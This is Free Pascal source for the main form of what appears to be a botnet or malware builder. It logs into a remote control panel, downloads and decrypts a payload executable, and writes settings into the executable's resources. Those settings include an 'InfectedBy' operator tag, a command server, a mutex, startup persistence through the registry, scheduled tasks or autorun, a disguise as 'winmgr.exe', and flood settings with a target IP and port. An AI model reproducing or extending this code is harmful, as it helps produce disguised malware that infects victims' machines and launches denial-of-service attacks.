unit MainUnit;

{$mode objfpc}{$H+}

interface

uses
  Classes, Windows, FileUtil, Forms, Controls, Graphics,
  Dialogs, ComCtrls, ExtCtrls, StdCtrls, Menus, BCButton, BCTypes,
  SysUtils, LCLType, IdHTTP, INIFiles, Logic;

type

  { TBuildForm }

  TBuildForm = class(TForm)
    BaseLocLabel: TLabel;
    BaseLocButton: TBCButton;
    BindPanel: TPanel;
    AboutPanel: TPanel;
    Hat: TIdHTTP;
    SaveButton: TBCButton;
    BuildStatLabel: TLabel;
    SaveDialog: TSaveDialog;
    ServerLabel: TLabel;
    UserLabel: TLabel;
    PassLabel: TLabel;
    ServerEdit: TEdit;
    UserEdit: TEdit;
    PassEdit: TEdit;
    RegLabel: TLabel;
    TaskLabel: TLabel;
    AutoLabel: TLabel;
    StartupLabel: TLabel;
    RegRadio: TRadioButton;
    TaskRadio: TRadioButton;
    AutoRadio: TRadioButton;
    RandButton: TBCButton;
    MutexEdit: TEdit;
    IntLabel: TLabel;
    DelayLabel: TLabel;
    IntEdit: TEdit;
    DelayEdit: TEdit;
    BuildButton: TBCButton;
    MutexLabel: TLabel;
    ScanButton: TBCButton;
    BuildMenu: TBCButton;
    BindMenu: TBCButton;
    BuildPanel: TPanel;
    InfectedLabel: TLabel;
    IconDialog: TOpenDialog;
    LocMenu: TPopupMenu;
    MyDocItem: TMenuItem;
    FavItem: TMenuItem;
    GamesItem: TMenuItem;
    BackShape: TShape;
    TempItem: TMenuItem;
    AppDataItem: TMenuItem;
    LocalAppItem: TMenuItem;
    PrefixEdit: TEdit;
    IconImage: TImage;
    BrowseButton: TBCButton;
    DefaultIcon: TBCButton;
    BaseNameEdit: TEdit;
    PrefixLabel: TLabel;
    InfLabel: TLabel;
    BaseNameLabel: TLabel;
    SettingsPanel: TPanel;
    SettingsMenu: TBCButton;
    MinimizeButton: TBCButton;
    MoveButton: TBCButton;
    AboutMenu: TBCButton;
    CloseButton: TBCButton;
    MenuSeparator: TShape;
    TopMenu: TPanel;
    DelaySelector: TUpDown;
    procedure BrowseButtonClick(Sender: TObject);
    procedure BuildButtonClick(Sender: TObject);
    procedure DefaultIconClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure LocMenuDrawItem(Sender: TObject; ACanvas: TCanvas; ARect: TRect;
      AState: TOwnerDrawState);
    procedure LocMenuMeasureItem(Sender: TObject; ACanvas: TCanvas; var AWidth,
      AHeight: Integer);
    procedure MenuClick(Sender: TObject);
    procedure CloseButtonClick(Sender: TObject);
    procedure LocalAppItemClick(Sender: TObject);
    procedure MenuItem(Sender: TObject);
    procedure MinimizeButtonClick(Sender: TObject);
    procedure MoveButtonMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure MoveButtonMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure MoveButtonMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure MenuItemClick(Sender: TObject);
    procedure RandButtonClick(Sender: TObject);
    procedure SaveButtonClick(Sender: TObject);
  private

  public
    procedure ChangeTab(AName: String);
    procedure GenMutex;
    procedure LoadSettings;
    procedure SaveSettings;
    procedure Login;
    function BuildFile: Boolean;
    function CheckBuild: Boolean;
    procedure Log(StrToLog: String);
  end;

var
  BuildForm: TBuildForm;
  PX, PY: Integer;
  MouseIsDown: Boolean;

  IconLoc, BaseLoc: String;

  Settings: TINIFile;

const
  ActiveC  = $0044F4AA;
  PassiveC = $001D1616;
  PActiveC = $00453434;
  PPassive = $00100C0C;
  MenuItemHeight = 26;

implementation

{$R *.lfm}

{ TBuildForm }

function CheckEmpty(Str, Msg: String; var _E: String): Boolean;
Begin
  Result:=True;
  if Length(Str)=0 then Begin
    Result:=False;
    _E+=Msg+', ';
  end;
End;

function TBuildForm.CheckBuild: Boolean;
var
  Empty: String = '';
Begin
  //Check for empty values
  Result:=CheckEmpty(PrefixEdit.Text, 'Prefix', Empty);
  Result:=CheckEmpty(BaseNameEdit.Text, 'Base Name', Empty) and Result;
  Result:=CheckEmpty(BaseLoc, 'Base Location', Empty) and Result;
  Result:=CheckEmpty(IntEdit.Text, 'Internal Name', Empty) and Result;
  if Result then Begin
    //Fix value formats
    if Length(MutexEdit.Text)=0 then GenMutex;
    if RightStr(PrefixEdit.Text, 1)<>'-' then PrefixEdit.Text:=PrefixEdit.Text+'-';
  end else Begin
    Delete(Empty, Length(Empty)-1, 2);
    ShowMessage('The following fields cannot be empty: '+Empty+'.');
  End;
end;

function TBuildForm.BuildFile: Boolean;
var
  MS: TMemoryStream;
  SCast: TStringList;
  _Set: TMemINIFile;
  C: Byte;
  Res: THandle;
Begin
  Result:=True;
  BuildButton.Enabled:=False;
  ScanButton.Enabled:=False;

  Log('Downloading a fresh build...');
  MS:=TMemoryStream.Create;
  try
    Hat.Get(Settings.ReadString('General', 'Server', 'http://localhost')+'/modules/Build.mod', MS);
    MS.Position:=0;
    ToggleCrypt(MS, 7019);
    MS.SaveToFile('Build.exe');
  except on E: Exception do Begin
    Result:=False;
    Log('Error while downloading:'+sLineBreak+E.Message);
    ChDel('Build.exe');
    MS.Free;
    Exit;
  end;
  end;

  Log('Compiling the options...');
  MS.Clear;
  _Set:=TMemINIFile.Create(MS);
  try
    With _Set do Begin
      WriteInteger('General', 'FirstRun', 1);
      WriteString('General', 'InfectedBy', InfectedLabel.Caption);
      WriteString('General', 'Server', Settings.ReadString('General', 'Server', 'http://localhost'));
      WriteInteger('General', 'Delay', DelaySelector.Position);
      WriteString('General', 'Mutex', MutexEdit.Text);

      WriteString('Install', 'Prefix', PrefixEdit.Text);
      WriteString('Install', 'BaseName', BaseNameEdit.Text);
      WriteString('Install', 'BaseLocation', BaseLoc);
      WriteString('Install', 'InternalName', IntEdit.Text);
      if RegRadio.Checked then C:=1
      else if TaskRadio.Checked then C:=2
      else if AutoRadio.Checked then C:=3;
      WriteInteger('Install', 'Startup', C);

      WriteString('Flood', 'DefaultIP', '1.1.1.1');
      WriteInteger('Flood', 'DefaultPort', 80);
      WriteString('Flood', 'Message', 'My dreaming ends... Your nightmare begins!');
      WriteInteger('Flood', 'MaxPower', 1);

      SCast:=TStringList.Create;
      GetStrings(SCast);
    end;
  except on E: Exception do Begin
    Result:=False;
    Log('Error while compiling:'+sLineBreak+E.Message);
    ChDel('Build.exe');
  end;
  end;
  _Set.Free;
  MS.Free;
  if Not(Result) then Exit;

  try
    Res:=BeginUpdateResource('Build.exe', False);
    UpdateResource(Res, RT_RCDATA, 'Settings', LANG_NEUTRAL, @SCast.Text[1], Length(SCast.Text));
    EndUpdateResource(Res, False);
    if FileExists(IconLoc) then Begin
      ChangeIcon('Build.exe', IconLoc);
    end;
  except on E: Exception do Begin
    Result:=False;
    Log('Error while updating the resources:'+sLineBreak+E.Message);
    ChDel('Build.exe');
  end;
  end;
  SCast.Free;
  if Not(Result) then Exit;

  Log('Nothing to build...');
  ScanButton.Enabled:=True;
  BuildButton.Enabled:=True;
end;

procedure TBuildForm.Log(StrToLog: String);
Begin
  BuildStatLabel.Caption:=StrToLog;
  Application.ProcessMessages;
end;

procedure TBuildForm.LoadSettings;
Begin
  Settings:=TINIFile.Create(ChangeFileExt(Application.ExeName, '.ini'));
  ServerEdit.Text:=Settings.ReadString('General', 'Server', 'http://localhost');
  UserEdit.Text:=Settings.ReadString('General', 'User', 'User');
  PassEdit.Text:=Settings.ReadString('General', 'Pass', '');
  if Length(PassEdit.Text)>0 then PassEdit.Text:=DecryptStr(PassEdit.Text, MasterKey);
  Left:=Settings.ReadInteger('Window', 'PosX', 175);
  Top:=Settings.ReadInteger('Window', 'PosY', 45);
  PrefixEdit.Text:=Settings.ReadString('Build', 'Prefix', 'Doctor');
  BaseNameEdit.Text:=Settings.ReadString('Build', 'BaseName', 'Plague');
  BaseLoc:=Settings.ReadString('Build', 'BaseLocation', '');
  if Length(BaseLoc)>0 then BaseLocButton.Caption:=BaseLoc else BaseLocButton.Caption:='Select one';
  IconLoc:=Settings.ReadString('Build', 'Icon', '');
  if Not(FileExists(IconLoc)) then IconLoc:='';
  if Length(IconLoc)>0 then IconImage.Picture.LoadFromFile(IconLoc)
  else IconImage.Picture.LoadFromFile('img\default.ico');
  IntEdit.Text:=Settings.ReadString('Build', 'InternalName', 'winmgr.exe');
  DelaySelector.Position:=Settings.ReadInteger('Build', 'Delay', 5000);
  Case Settings.ReadInteger('Build', 'Startup', 3) of
  1: RegRadio.Checked:=True;
  2: TaskRadio.Checked:=True;
  3: AutoRadio.Checked:=True;
  end;
end;

procedure TBuildForm.SaveSettings;
var
  C: Byte;
Begin
  Settings.WriteString('General', 'Server', ServerEdit.Text);
  Settings.WriteString('General', 'User', UserEdit.Text);
  Settings.WriteString('General', 'Pass', EncryptStr(PassEdit.Text{%H-}, MasterKey));
  Settings.WriteString('Build', 'Prefix', PrefixEdit.Text);
  Settings.WriteString('Build', 'BaseName', BaseNameEdit.Text);
  Settings.WriteString('Build', 'BaseLocation', BaseLoc);
  Settings.WriteString('Build', 'InternalName', IntEdit.Text);
  Settings.WriteInteger('Build', 'Delay', DelaySelector.Position);
  Settings.WriteString('Build', 'Icon', IconLoc);
  if RegRadio.Checked then C:=1
  else if TaskRadio.Checked then C:=2
  else if AutoRadio.Checked then C:=3;
  Settings.WriteInteger('Build', 'Startup', C);
end;

procedure TBuildForm.Login;
var
  P: TStringList;
  R, T: String;
  Error: Boolean = False;
Begin
  if Settings.ReadString('General', 'Server', 'UNKNOWN')<>'UNKNOWN' then Begin
    T:=Settings.ReadString('General', 'Pass', '');
    if Length(T)>0 then T:=DecryptStr(T, MasterKey);
    P:=TStringList.Create;
    P.Add('user='+Settings.ReadString('General', 'User', 'User'));
    P.Add('pass='+T);
    P.Add('builder=true');
    try
      R:=Hat.Post(Settings.ReadString('General', 'Server', 'http://localhost')+'/login.php', P);
    except on E: Exception do Begin
      Error:=True;
      ShowMessage('Login failed! Please check your server. ['+E.Message+']');
    end;
    end;
    P.Free;
    if Not(Error) then
    if R='Success' then Begin
      InfectedLabel.Caption:=Settings.ReadString('General', 'User', 'Unknown');
      BuildButton.Enabled:=True;
      ScanButton.Enabled:=True;
    end else ShowMessage('Login failed! Plase check your username/password.');
  end else Begin
    ChangeTab('SettingsMenu');
    ShowMessage('Please adjust your settings!');
  end;
end;

procedure TBuildForm.ChangeTab(AName: String);
Begin
  if AName='BuildMenu' then Begin
    BuildMenu.StateNormal.Background.Style:=bbsGradient;
    BuildPanel.Visible:=True;
  end else Begin
    BuildMenu.StateNormal.Background.Style:=bbsColor;
    BuildPanel.Visible:=False;
  end;
  if AName='SettingsMenu' then Begin
    SettingsMenu.StateNormal.Background.Style:=bbsGradient;
    SettingsPanel.Visible:=True;
  end else Begin
    SettingsMenu.StateNormal.Background.Style:=bbsColor;
    SettingsPanel.Visible:=False;
  end;
  if AName='BindMenu' then Begin
    BindMenu.StateNormal.Background.Style:=bbsGradient;
    BindPanel.Visible:=True;
  end else Begin
    BindMenu.StateNormal.Background.Style:=bbsColor;
    BindPanel.Visible:=False;
  end;
  if AName='AboutMenu' then Begin
    AboutMenu.StateNormal.Background.Style:=bbsGradient;
    AboutPanel.Visible:=True;
  end else Begin
    AboutMenu.StateNormal.Background.Style:=bbsColor;
    AboutPanel.Visible:=False;
  end;
end;

procedure TBuildForm.CloseButtonClick(Sender: TObject);
begin
  Close;
end;

procedure TBuildForm.LocalAppItemClick(Sender: TObject);
begin

end;

procedure TBuildForm.MenuItem(Sender: TObject);
begin

end;

procedure TBuildForm.MenuClick(Sender: TObject);
begin
  ChangeTab((Sender as TComponent).Name);
end;

procedure TBuildForm.FormCreate(Sender: TObject);
begin
  ChangeTab('BuildMenu');
  PassEdit.PasswordChar:=chr(149);
  LoadSettings;
  Login;
end;

procedure TBuildForm.FormDestroy(Sender: TObject);
begin
  Settings.Free;
end;

procedure TBuildForm.LocMenuDrawItem(Sender: TObject; ACanvas: TCanvas;
  ARect: TRect; AState: TOwnerDrawState);
var
  H: LongInt;
  S: String;
begin
  ACanvas.Brush.Color:=PPassive;
  ACanvas.Font.Name:='Corbel';
  ACanvas.Font.Height:=-14;
  ACanvas.Font.Color:=clWhite;
  if (odChecked in AState) or (odSelected in AState) then
    ACanvas.Brush.Color:=PActiveC;
  ACanvas.FillRect(ARect);
  S:=(Sender as TMenuItem).Caption;
  H:=ARect.Top+Round((MenuItemHeight-16)/2);
  ACanvas.Draw(10, H, BrowseButton.Glyph);
  H:=ARect.Top+Round((MenuItemHeight-ACanvas.TextHeight(S))/2);
  ACanvas.TextOut(10+16+10, H, S);
end;

procedure TBuildForm.LocMenuMeasureItem(Sender: TObject; ACanvas: TCanvas;
  var AWidth, AHeight: Integer);
begin
  AWidth:=BaseLocButton.Width-20;
  AHeight:=MenuItemHeight;
end;

procedure TBuildForm.BrowseButtonClick(Sender: TObject);
begin
  if IconDialog.Execute then Begin
    IconLoc:=IconDialog.FileName;
    try
      IconImage.Picture.LoadFromFile(IconLoc);
    except
      ShowMessage('Failed to load icon!');
      IconLoc:='';
    end;
  end;
end;

procedure TBuildForm.BuildButtonClick(Sender: TObject);
begin
  if CheckBuild then
    if SaveDialog.Execute then
      if BuildFile then Begin
        CopyFile('Build.exe', SaveDialog.FileName, True, False);
        ChDel('Build.exe');
        ShowMessage('Build succeeded!');
      end;
end;

procedure TBuildForm.DefaultIconClick(Sender: TObject);
begin
  IconLoc:='';
  IconImage.Picture.LoadFromFile('img\exe_big.png');
end;

procedure TBuildForm.MinimizeButtonClick(Sender: TObject);
begin
  Application.Minimize;
end;

procedure TBuildForm.MoveButtonMouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
  if Button = mbLeft then begin
    MouseIsDown := True;
    PX := X;
    PY := Y;
  end;
end;

procedure TBuildForm.MoveButtonMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
  if MouseIsDown then begin
    SetBounds(Left + (X - PX), Top + (Y - PY), Width, Height);
  end;
end;

procedure TBuildForm.MoveButtonMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
  MouseIsDown:=False;
  Settings.WriteInteger('Window', 'PosX', Left);
  Settings.WriteInteger('Window', 'PosY', Top);
end;

procedure TBuildForm.MenuItemClick(Sender: TObject);
var
  S: TMenuItem;
begin
  S:=(Sender as TMenuItem);
  BaseLoc:=S.Caption;
  S.Checked:=True;
  BaseLocButton.Caption:=BaseLoc;
end;

procedure TBuildForm.GenMutex;
var
  ID: TGUID;
  S:  String;
begin
  if CreateGUID(ID) = S_OK then Begin
    S:=GUIDToString(ID);
    Delete(S, 1, 1);
    Delete(S, Length(S), 1);
    MutexEdit.Text:=S;
  end;
end;

procedure TBuildForm.RandButtonClick(Sender: TObject);
Begin
  GenMutex;
end;

procedure TBuildForm.SaveButtonClick(Sender: TObject);
begin
  SaveSettings;
  ShowMessage('Settings saved! Please restart the builder for the changes to take effect!');
end;

end.

